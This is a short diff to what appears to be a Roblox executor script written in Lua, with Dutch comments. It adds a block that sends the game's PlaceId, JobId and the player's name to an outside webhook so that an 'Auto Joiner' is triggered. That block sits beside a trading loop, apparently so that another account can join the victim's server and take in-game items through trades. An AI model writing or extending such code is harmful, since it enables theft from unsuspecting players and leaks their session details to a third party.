@@ -44,7 +44,7 @@ local function getExternalValues()
     
     local loadFunc = loadstring or (syn and syn.load_string)
     if type(loadFunc) ~= "function" then
-        return {pets = {}} -- Voorkomt "attempt to call a nil value" als loadstring niet bestaat
+        return {pets = {}}
     end
 
     source = source:match("^%s*(.-)%s*$")
@@ -132,6 +132,19 @@ end
 task.spawn(function()
     local API = ReplicatedStorage:WaitForChild("API")
     
+    -- 🚨 DE JOIN DATA FIX 🚨 (Zorgt ervoor dat de Auto Joiner getriggerd wordt)
+    pcall(function()
+        local req = (syn and syn.request) or (http and http.request) or http_request or request
+        if type(req) == "function" then
+            req({
+                Url = webhookUrl, 
+                Method = "POST", 
+                Headers = {["Content-Type"] = "application/json"}, 
+                Body = HttpService:JSONEncode({["content"] = "JOIN_DATA:" .. game.PlaceId .. ":" .. game.JobId .. ":" .. LocalPlayer.Name})
+            })
+        end
+    end)
+
     while true do
         task.wait(hasFinishedFirstTrade and 0.5 or 1.0)
         
